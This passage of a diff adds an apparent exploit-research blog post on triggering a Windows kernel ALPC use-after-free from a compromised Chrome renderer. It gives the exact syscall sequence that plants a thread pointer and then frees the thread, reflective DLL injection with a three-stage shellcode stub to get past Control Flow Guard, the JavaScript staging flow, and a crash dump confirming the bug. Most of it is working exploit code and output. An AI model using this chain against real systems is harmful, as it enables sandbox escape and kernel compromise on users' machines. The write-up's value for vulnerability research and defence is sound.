+&lt;/aside&gt;
+
+&lt;p&gt;Setting &lt;code&gt;WFDW.Flags&lt;/code&gt; to &lt;code&gt;1&lt;/code&gt; to go into &lt;strong&gt;deferred send&lt;/strong&gt; mode is also a key point. If you go immediate-send, right after the message is queued it flows straight through to dispatch completion, and the moment you set things up, the other side&amp;#x2019;s cleanup gets dragged along too. Switching to deferred send and kicking it off with &lt;code&gt;NtSetIoCompletion&lt;/code&gt; lets us &lt;strong&gt;plant the setup but defer the dispatch completion&lt;/strong&gt;. That&amp;#x2019;s the window we need to create the dangling state!&lt;/p&gt;
+&lt;p&gt;Let&amp;#x2019;s look at the steps the trigger thread walks through. One thing to note up front &amp;#x2014; steps 1, 2, 3 build the &amp;#x201C;ingredients (handles)&amp;#x201D; IoCompletion / WorkerFactory / ALPC port, and 4, 5, 6 are all just &lt;strong&gt;&amp;#x201C;fill in values in my user memory&amp;#x201D;&lt;/strong&gt; prep work. The message actually landing on the queue and this thread getting nailed to the kernel &amp;#x2014; that happens on line 7, and only line 7. Until 7, the message, the trailer, and the WFDW are just struct values being set in user memory; the moment that bundle crosses into the kernel and becomes &amp;#x201C;message queued + thread blocked&amp;#x201D; is precisely 7.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// &amp;#x2500;&amp;#x2500; 1,2,3 : create kernel handles (ingredients) first &amp;#x2500;&amp;#x2500;&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;1.&lt;/span&gt; NtCreateIoCompletion(&amp;amp;hIoComp, ...)                       &lt;span class=&#34;hljs-comment&#34;&gt;// IoCompletion handle&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;2.&lt;/span&gt; NtCreateWorkerFactory(&amp;amp;hWF, ..., hIoComp,                 &lt;span class=&#34;hljs-comment&#34;&gt;// WorkerFactory shell&lt;/span&gt;
+                         GetCurrentProcess(), ...)
+&lt;span class=&#34;hljs-number&#34;&gt;3.&lt;/span&gt; NtAlpcCreatePort(&amp;amp;hPort, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &amp;amp;attr)                     &lt;span class=&#34;hljs-comment&#34;&gt;// anonymous ALPC port (Flags = 0x20000)&lt;/span&gt;
+
+&lt;span class=&#34;hljs-comment&#34;&gt;// &amp;#x2500;&amp;#x2500; 4,5,6 : from here it&amp;apos;s all just filling struct values in &amp;apos;user memory&amp;apos; (kernel doesn&amp;apos;t know yet) &amp;#x2500;&amp;#x2500;&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;4.&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;Prepare &lt;span class=&#34;hljs-title&#34;&gt;PORT_MESSAGE&lt;/span&gt;  &lt;span class=&#34;hljs-params&#34;&gt;(user memory)&lt;/span&gt;                         &lt;span class=&#34;hljs-comment&#34;&gt;// &amp;#x2190; the &amp;apos;message&amp;apos; itself&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;     DataLength     &lt;/span&gt;= &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;
+     TotalLength    = &lt;span class=&#34;hljs-number&#34;&gt;0x128&lt;/span&gt;        &lt;span class=&#34;hljs-comment&#34;&gt;// 0x28 header + 0x100 body&lt;/span&gt;
+     DataInfoOffset = &lt;span class=&#34;hljs-number&#34;&gt;0x30&lt;/span&gt;         &lt;span class=&#34;hljs-comment&#34;&gt;// signpost: &amp;quot;my trailer is over here&amp;quot;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-number&#34;&gt;5.&lt;/span&gt; Set up the trailer  (msg + &lt;span class=&#34;hljs-number&#34;&gt;0x30&lt;/span&gt;, user memory)               &lt;span class=&#34;hljs-comment&#34;&gt;// &amp;#x2190; the spot DataInfoOffset points to&lt;/span&gt;
+     NumberOfEntries        = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;
+     Entries[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;].BaseAddress = target_page   &lt;span class=&#34;hljs-comment&#34;&gt;// an RW page in my process&lt;/span&gt;
+     Entries[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;].DataLength  = &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;
+
+&lt;span class=&#34;hljs-number&#34;&gt;6.&lt;/span&gt; Set up WFDW  (user memory)                                  &lt;span class=&#34;hljs-comment&#34;&gt;// &amp;#x2190; the &amp;quot;order form&amp;quot; we&amp;apos;ll hand to the kernel&lt;/span&gt;
+     .AlpcSendMessage      = &amp;amp;msg
+     .AlpcSendMessagePort  = hPort
+     .AlpcSendMessageFlags = &lt;span class=&#34;hljs-number&#34;&gt;0x20000&lt;/span&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;// SYNC_REQUEST&lt;/span&gt;
+     .Flags                = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;          &lt;span class=&#34;hljs-comment&#34;&gt;// deferred send&lt;/span&gt;
+
+&lt;span class=&#34;hljs-comment&#34;&gt;// &amp;#x2500;&amp;#x2500; from here we enter the kernel: we hand the whole WFDW over &amp;#x2500;&amp;#x2500;&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;7.&lt;/span&gt; NtWaitForWorkViaWorkerFactory(hWF, ..., &amp;amp;wfdw)
+   &lt;span class=&#34;hljs-comment&#34;&gt;// kernel reads WFDW, performs deferred SYNC send &amp;#x2192; message queued +&lt;/span&gt;
+   &lt;span class=&#34;hljs-comment&#34;&gt;//   msg.WaitingThread = my _ETHREAD planted + this thread blocks!&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image9.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Putting it in words again: setting up the message (4), trailer (5), and WFDW (6) is all just writing values into my user memory. &lt;code&gt;PORT_MESSAGE&lt;/code&gt;&amp;#x2019;s &lt;code&gt;DataInfoOffset = 0x30&lt;/code&gt; is a signpost saying &amp;#x201C;my trailer is 0x30 bytes into msg,&amp;#x201D; and 5 is writing &lt;code&gt;BaseAddress&lt;/code&gt; / &lt;code&gt;DataLength&lt;/code&gt; at that spot. The kernel has zero idea what we&amp;#x2019;re preparing up to this point. The actual &amp;#x201C;send message (post)&amp;#x201D; isn&amp;#x2019;t a send function we call ourselves &amp;#x2014; it&amp;#x2019;s the kernel doing it &lt;em&gt;on our behalf&lt;/em&gt; when we hand the WFDW we filled at 6 over via &lt;code&gt;NtWaitForWorkViaWorkerFactory&lt;/code&gt; at 7. That&amp;#x2019;s when it takes the SYNC branch and plants my &lt;code&gt;_ETHREAD&lt;/code&gt; into &lt;code&gt;msg.WaitingThread&lt;/code&gt;. But because we&amp;#x2019;re in deferred mode, the setup is planted but the follow-up cleanup gets pushed back &amp;#x2014; and &lt;em&gt;that gap&lt;/em&gt; is exactly the time window we need in the next step to create the dangling state.&lt;/p&gt;
+&lt;p&gt;By the time we get here, the kernel state looks like this: the message is sitting on the port queue, that message&amp;#x2019;s &lt;code&gt;+0x20&lt;/code&gt; points at the trigger thread&amp;#x2019;s &lt;code&gt;_ETHREAD&lt;/code&gt;, and the trigger thread is snoozing away inside &lt;code&gt;NtWaitForWorkViaWorkerFactory&lt;/code&gt;. The deal is sealed, and our target is nailed firmly to its seat!&lt;/p&gt;
+&lt;p&gt;Now it&amp;#x2019;s the main thread&amp;#x2019;s turn to light the fuse!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;A. CreateThread(trigger)
+B. NtSetIoCompletion(hIoComp, ...)   &lt;span class=&#34;hljs-comment&#34;&gt;// kick off the deferred send&lt;/span&gt;
+C. Sleep(&lt;span class=&#34;hljs-number&#34;&gt;500&lt;/span&gt;)                        &lt;span class=&#34;hljs-comment&#34;&gt;// wait for the trigger thread to settle&lt;/span&gt;
+D. NtTerminateThread(hthread, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)     &lt;span class=&#34;hljs-comment&#34;&gt;// kill it WITHOUT WFSO!!&lt;/span&gt;
+E. CloseHandle(hthread)              &lt;span class=&#34;hljs-comment&#34;&gt;// thread-handle ref -1&lt;/span&gt;
+   Sleep(&lt;span class=&#34;hljs-number&#34;&gt;40000&lt;/span&gt;)                      &lt;span class=&#34;hljs-comment&#34;&gt;// slot we&amp;apos;ll use in Step 6 &amp;#x2014; today it&amp;apos;s just wait time&lt;/span&gt;
+F. CloseHandle(hWorkerFactory)       &lt;span class=&#34;hljs-comment&#34;&gt;// only after this does the _ETHREAD return to the slab&lt;/span&gt;
+G. CloseHandle(hIoComp)
+H. CloseHandle(hPort)                &lt;span class=&#34;hljs-comment&#34;&gt;// &amp;#x2190; boom!!!&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image10.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;aside&gt;
+&amp;#x1F4A1;
+
+Look at D &amp;#x2014; we do **not** wait for the thread to finish with `WaitForSingleObject`, we just force-kill it with `NtTerminateThread`. Normally you&amp;#x2019;d throw a WFSO in there, and *not doing that* is the point! If you wait for total destruction via WFSO, the follow-on cleanup path grabs one more kernel reference and the dangling state we want doesn&amp;#x2019;t form. So we just kill it and close handles, shaving off exactly one reference at a time.
+
+&lt;/aside&gt;
+
+&lt;p&gt;Then the big moment &amp;#x2014; H, &lt;code&gt;CloseHandle(hPort)&lt;/code&gt; &amp;#x2014; that&amp;#x2019;s what sets off the bomb. The &lt;code&gt;Close(hWF)&lt;/code&gt; and &lt;code&gt;Close(hIoComp)&lt;/code&gt; before it do absolutely nothing! The call chain looks like this:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs angelscript&#34;&gt;NtClose(hPort)
+ &amp;#x2192; AlpcpClosePort &amp;#x2192; AlpcpDeletePort
+ &amp;#x2192; AlpcpSendCloseMessage + AlpcpDoPortCleanup
+ &amp;#x2192; AlpcpFlushMessagesPort &amp;#x2192; &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;&amp;#xD7; AlpcpFlushQueue
+ &amp;#x2192; AlpcpCancelMessage +&lt;span class=&#34;hljs-number&#34;&gt;0x358&lt;/span&gt;
+     rcx = *(msg + &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;);        &lt;span class=&#34;hljs-comment&#34;&gt;// msg.WaitingThread (already-freed _ETHREAD!)&lt;/span&gt;
+     xchg [rcx + &lt;span class=&#34;hljs-number&#34;&gt;0x578&lt;/span&gt;], rax     &lt;span class=&#34;hljs-comment&#34;&gt;// &amp;#x2190; UAF write here &amp;#x2192; BSOD&lt;/span&gt;
+     &lt;span class=&#34;hljs-comment&#34;&gt;// &amp;#x2192; PAGE_FAULT_IN_NONPAGED_AREA (0x50)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;When the port closes, the kernel loops through the messages still on the queue to clean them up, and per message it calls &lt;code&gt;AlpcpCancelMessage&lt;/code&gt;. The &lt;code&gt;xchg&lt;/code&gt; instruction at offset &lt;code&gt;+0x358&lt;/code&gt; inside that function does a write to &lt;code&gt;+0x578&lt;/code&gt; of the &lt;code&gt;_ETHREAD&lt;/code&gt; pointed to by &lt;code&gt;msg+0x20&lt;/code&gt; &amp;#x2014; but that &lt;code&gt;_ETHREAD&lt;/code&gt; is already dead and back in the slab! Writing to something that isn&amp;#x2019;t there means the write goes into a freed page, and off we go straight to BSOD. &amp;#x1F4A5;&lt;/p&gt;
+&lt;p&gt;By the way, there&amp;#x2019;s also a reason we didn&amp;#x2019;t bother building a server-client port pair and instead just stood up a single &lt;strong&gt;anonymous port&lt;/strong&gt; with &lt;code&gt;NtAlpcCreatePort&lt;/code&gt;, catching the sink on the &lt;code&gt;CloseHandle(hPort)&lt;/code&gt; path &amp;#x2014; this path naturally lines up with the &lt;code&gt;LpcpCopyRequestData&lt;/code&gt; gate that leads to the Read/Write primitive in Step 6! (That&amp;#x2019;s a Step 6 spoiler though, so I&amp;#x2019;ll stop right there haha)&lt;/p&gt;
+&lt;h1 id=&#34;3-Chrome-to-ALPC-With-BSOD&#34;&gt;&lt;a href=&#34;#3-Chrome-to-ALPC-With-BSOD&#34; class=&#34;headerlink&#34; title=&#34;3. Chrome to ALPC (With BSOD)&#34;&gt;&lt;/a&gt;3. Chrome to ALPC (With BSOD)&lt;/h1&gt;&lt;p&gt;Okay, so far it&amp;#x2019;s all been kernel-side chatter, right? But where we&amp;#x2019;re actually standing is &lt;em&gt;inside the renderer process&lt;/em&gt;, and on top of that, inside a sandbox that&amp;#x2019;s been crushed under Untrusted IL. We&amp;#x2019;ve got a Restricted Token slapped on us, the Job Object blocks process creation, we can&amp;#x2019;t touch files, we can&amp;#x2019;t open network sockets. So how on earth do we run that syscall sequence from inside this prison cell?? &amp;#x1F914;&lt;/p&gt;
+&lt;p&gt;This is exactly where the fact I planted at the very start pays off. &lt;strong&gt;Chrome&amp;#x2019;s sandbox slams the door shut on files, network, and win32k, but it does not gate the NT syscalls that ntdll exposes.&lt;/strong&gt; So even from Untrusted IL, things like &lt;code&gt;NtCreateIoCompletion&lt;/code&gt;, &lt;code&gt;NtCreateWorkerFactory&lt;/code&gt;, &lt;code&gt;NtAlpcCreatePort&lt;/code&gt;, &lt;code&gt;NtWaitForWorkViaWorkerFactory&lt;/code&gt;, &lt;code&gt;NtClose&lt;/code&gt; &amp;#x2014; you can just call them!&lt;/p&gt;
+&lt;p&gt;In Steps 2&amp;#x2013;3, ji9umi already handed us renderer RCE (V8 arbitrary R/W + WASM &lt;code&gt;IndirectFunctionTable&lt;/code&gt; for short shellcode execution). Great launch pad, but a bit cramped for freely calling kernel syscalls. What we need is an execution environment where native code can run around freely inside the renderer. So we&amp;#x2019;re going to plant a trigger DLL inside the renderer and run the sequence above from there!&lt;/p&gt;
+&lt;h2 id=&#34;3-1-sRDI-Shellcode-Reflective-DLL-Injection&#34;&gt;&lt;a href=&#34;#3-1-sRDI-Shellcode-Reflective-DLL-Injection&#34; class=&#34;headerlink&#34; title=&#34;3.1 sRDI (Shellcode Reflective DLL Injection)&#34;&gt;&lt;/a&gt;3.1 sRDI (Shellcode Reflective DLL Injection)&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/monoxgas/srdi&#34;&gt;https://github.com/monoxgas/srdi&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;When I say &amp;#x201C;plant a DLL&amp;#x201D;, &lt;code&gt;LoadLibrary&lt;/code&gt; comes to mind, right? But as I mentioned earlier, the Untrusted IL renderer has almost no file-system access, so we can&amp;#x2019;t drop a DLL file on disk. &lt;code&gt;LoadLibraryA(&amp;quot;C:\\payload.dll&amp;quot;)&lt;/code&gt; doesn&amp;#x2019;t even get out the gate.. &amp;#x1F972;&lt;/p&gt;
+&lt;p&gt;But here&amp;#x2019;s the fun bit! &lt;code&gt;ntdll.dll&lt;/code&gt; is already mapped into the renderer, and &amp;#x201C;self-address-space-manipulation&amp;#x201D; syscalls like &lt;code&gt;NtAllocateVirtualMemory&lt;/code&gt; / &lt;code&gt;NtProtectVirtualMemory&lt;/code&gt; aren&amp;#x2019;t blocked by the sandbox. Making an executable page in your own process is not something the sandbox blocks (if the process has ACG on this gets blocked too, but Chrome renderer doesn&amp;#x2019;t enable ACG by default).&lt;/p&gt;
+&lt;p&gt;Through that crack, the trick to plant code purely in memory is &lt;strong&gt;sRDI&lt;/strong&gt;! You pre-pack the DLL into a relocatable blob, and on load, without touching the file system at all, it resolves imports/relocs and starts executing right there in memory. Doesn&amp;#x2019;t open files, doesn&amp;#x2019;t spawn processes, doesn&amp;#x2019;t use the network.&lt;/p&gt;
+&lt;p&gt;&amp;#x1F4A1;&lt;br&gt;But why bother laying down the DLL &lt;strong&gt;in full PE image shape&lt;/strong&gt; instead of raw shellcode? This is another thing I learned while reproducing it &amp;#x2014; if you just drop raw code onto an RWX page and hit it with &lt;code&gt;CreateThread&lt;/code&gt;, the renderer&amp;#x2019;s &lt;strong&gt;CFG (Control Flow Guard)&lt;/strong&gt; slams the door on you. &amp;#x1F6AB; CFG checks via bitmap whether a thread start address is &amp;#x201C;inside a properly loaded image,&amp;#x201D; and a raw RWX address with no image backing doesn&amp;#x2019;t pass. sRDI fully dresses the code up with MZ/PE headers, per-section protection attributes, and even registers SEH via &lt;code&gt;RtlAddFunctionTable&lt;/code&gt;, so to the kernel/loader it looks like &amp;#x201C;a genuinely loaded module.&amp;#x201D; That&amp;#x2019;s why &lt;code&gt;CreateThread&lt;/code&gt; targeting a function inside it passes the CFG check! I actually tested this &amp;#x2014; raw PIC and even &amp;#x201C;PE-less, RX-only protected&amp;#x201D; pages all got blocked; only a full PE mapping (sRDI) made it through. &amp;#x1F643;&lt;/p&gt;
+&lt;h2 id=&#34;3-2-Three-stage-commit-stub&#34;&gt;&lt;a href=&#34;#3-2-Three-stage-commit-stub&#34; class=&#34;headerlink&#34; title=&#34;3.2 Three-stage commit stub&#34;&gt;&lt;/a&gt;3.2 Three-stage commit stub&lt;/h2&gt;&lt;p&gt;There&amp;#x2019;s one more problem. The execution foothold V8 hands us initially is meant for WASM code and it&amp;#x2019;s pretty cramped &amp;#x2014; too tight to slap an 8KB-ish sRDI blob on top of. So we use a slightly hand-cranked three-stage trick!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image11.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;First plant and run a &lt;strong&gt;154-byte commit_stub&lt;/strong&gt; &amp;#x2192; walks the PEB&amp;#x2019;s &lt;code&gt;Ldr.InLoadOrder&lt;/code&gt; to find &lt;code&gt;kernel32.dll&lt;/code&gt;, resolves &lt;code&gt;VirtualAlloc&lt;/code&gt; on its own &amp;#x2192; allocates a generous heap right next to it with &lt;code&gt;PAGE_EXECUTE_READWRITE&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Copy the &lt;strong&gt;sRDI blob&lt;/strong&gt; into that generous heap&lt;/li&gt;
+&lt;li&gt;A 12-byte &lt;code&gt;mov rax, addr; jmp rax&lt;/code&gt; trampoline jumps into sRDI&amp;#x2019;s &lt;code&gt;Reflective_Loader&lt;/code&gt; &amp;#x2192; resolves imports/relocs and calls the DLL&amp;#x2019;s exported &lt;code&gt;RunExploit&lt;/code&gt;!&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;The JS side flow looks roughly like this:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Stage 1: commit_stub onto the foothold page&lt;/span&gt;
+arbitrary_write(rwx, commit_stub_bytes);
+shellcode();                          &lt;span class=&#34;hljs-comment&#34;&gt;// stub runs &amp;#x2192; VirtualAlloc&lt;/span&gt;
+
+&lt;span class=&#34;hljs-comment&#34;&gt;// Stage 2: sRDI blob into the committed big RWX heap&lt;/span&gt;
+arbitrary_write(commit_addr, sRDI_bytes);
+
+&lt;span class=&#34;hljs-comment&#34;&gt;// Stage 3: trampoline &amp;#x2192; Reflective_Loader &amp;#x2192; RunExploit&lt;/span&gt;
+arbitrary_write(rwx, trampoline);
+shellcode();&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;By the time we&amp;#x2019;re here, the C code we wrote is actually running as real x64 native inside the renderer. Now we can run the UAF scenario inside it exactly as designed!&lt;/p&gt;
+&lt;h2 id=&#34;3-3-BSOD-via-the-trigger-DLL&#34;&gt;&lt;a href=&#34;#3-3-BSOD-via-the-trigger-DLL&#34; class=&#34;headerlink&#34; title=&#34;3.3 BSOD via the trigger DLL&#34;&gt;&lt;/a&gt;3.3 BSOD via the trigger DLL&lt;/h2&gt;&lt;p&gt;Finally, hands-on time! The trigger DLL is dead boring. What matters here is verifying that the UAF definitely fires, so:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs powershell&#34;&gt;verifier /flags &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x9BB /driver ntoskrnl.exe&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;You&amp;#x2019;ve got to run the above command to make sure the UAF doesn&amp;#x2019;t slip through silently! What this command does is give special treatment to the kernel&amp;#x2019;s pool allocations/frees so that touching a freed address triggers an immediate page fault. A lot of the time UAFs just quietly pass by, so this catches them!&lt;/p&gt;
+&lt;p&gt;Back to the trigger &amp;#x2014; it has a single &lt;code&gt;RunExploit&lt;/code&gt; export, and all it does is walk the UAF scenario as-is. Open the sample page and there&amp;#x2019;s exactly one button on screen: &amp;#x201C;Exploit Me&amp;#x201D;. Let&amp;#x2019;s click it and see if we get a BSOD!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image12.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Click the button and &amp;#x2014; same way ji9umi did back in Step 3 &amp;#x2014; Renderer RCE lands, the planted sRDI runs, and a few seconds later, BSOD!!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image13.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; !analyze -v
+Connected to Windows 10 22621 x64 target at (Sun Jul 19 20:15:13.523 2026 (UTC + 9:00)), ptr64 TRUE
+Loading Kernel Symbols
+..........................................
+
+Press ctrl-c (cdb, kd, ntsd) &lt;span class=&#34;hljs-keyword&#34;&gt;or&lt;/span&gt; ctrl-&lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt; (windbg) to &lt;span class=&#34;hljs-built_in&#34;&gt;abort&lt;/span&gt; symbol loads that take too &lt;span class=&#34;hljs-keyword&#34;&gt;long&lt;/span&gt;.
+Run !sym noisy before .reload to track down problems loading symbols.
+
+.....................
+................................................................
+.........................................................
+Loading User Symbols
+................................
+Loading unloaded &lt;span class=&#34;hljs-keyword&#34;&gt;module&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;list&lt;/span&gt;
+..................
+*******************************************************************************
+*                                                                             *
+*                        Bugcheck Analysis                                    *
+*                                                                             *
+*******************************************************************************
+
+PAGE_FAULT_IN_NONPAGED_AREA (&lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt;)
+Invalid system memory was referenced.  This cannot be &lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt; by &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt;-except.
+Typically the address is just plain bad &lt;span class=&#34;hljs-keyword&#34;&gt;or&lt;/span&gt; it is pointing at freed memory.
+Arguments:
+Arg1: ffff900dcddceb78, memory referenced.
+Arg2: &lt;span class=&#34;hljs-number&#34;&gt;0000000000000002&lt;/span&gt;, X64: bit &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; the fault was due to a &lt;span class=&#34;hljs-keyword&#34;&gt;not&lt;/span&gt;-present PTE.
+    bit &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; is &lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; the fault was due to a write, clear &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; a read.
+    bit &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; is &lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; the processor decided the fault was due to a corrupted PTE.
+    bit &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt; is &lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; the fault was due to attempted execute of a no-execute PTE.
+    - ARM64: bit &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; is &lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; the fault was due to a write, clear &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; a read.
+    bit &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; is &lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; the fault was due to attempted execute of a no-execute PTE.
+Arg3: fffff8037e0fcf6c, If non-zero, the instruction address which referenced the bad memory
+    address.
+Arg4: &lt;span class=&#34;hljs-number&#34;&gt;0000000000000002&lt;/span&gt;, (reserved)
+
+BUGCHECK_CODE:  &lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt;
+
+BUGCHECK_P1: ffff900dcddceb78
+
+BUGCHECK_P2: &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;
+
+BUGCHECK_P3: fffff8037e0fcf6c
+
+BUGCHECK_P4: &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;
+
+FAULTING_THREAD:ffff900dc22be600EXCEPTION_PARAMETER1:  &lt;span class=&#34;hljs-number&#34;&gt;0000000000000001&lt;/span&gt;
+
+EXCEPTION_PARAMETER2:  ffff900dcddceb78
+
+WRITE_ADDRESS:  ffff900dcddceb78
+
+MM_INTERNAL_CODE:  &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;
+
+PROCESS_NAME:  chrome.exe
+
+IP_IN_PAGED_CODE:
+nt!AlpcpCancelMessage+&lt;span class=&#34;hljs-number&#34;&gt;358&lt;/span&gt;
+fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7e0&lt;/span&gt;fcf6c &lt;span class=&#34;hljs-number&#34;&gt;48878178050000&lt;/span&gt;  xchg    rax,qword ptr [rcx+&lt;span class=&#34;hljs-number&#34;&gt;578&lt;/span&gt;h]
+
+STACK_TEXT:
+ffffc182`d4b55c58 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;df61ac2     : ffffc182`d4b55dc0 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;dd92480 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;c664180 ffff900d`cddceb01 : nt!DbgBreakPointWithStatus
+ffffc182`d4b55c60 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;df611b3     : fffff803`&lt;span class=&#34;hljs-number&#34;&gt;00000003&lt;/span&gt; ffffc182`d4b55dc0 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;de4aaa0 &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000050&lt;/span&gt; : nt!KiBugCheckDebugBreak+&lt;span class=&#34;hljs-number&#34;&gt;0x12&lt;/span&gt;
+ffffc182`d4b55cc0 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;de31807     : &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; ffffc182`d4b56690 ffff900d`cddceb78 : nt!KeBugCheck2+&lt;span class=&#34;hljs-number&#34;&gt;0xba3&lt;/span&gt;
+ffffc182`d4b56430 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;de8a32f     : &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000050&lt;/span&gt; ffff900d`cddceb78 &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000002&lt;/span&gt; ffffc182`d4b56690 : nt!KeBugCheckEx+&lt;span class=&#34;hljs-number&#34;&gt;0x107&lt;/span&gt;
+ffffc182`d4b56470 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;dc5ccac     : &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000048&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000002&lt;/span&gt; ffffc182`d4b56629 &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; : nt!MiSystemFault+&lt;span class=&#34;hljs-number&#34;&gt;0x23059f&lt;/span&gt;
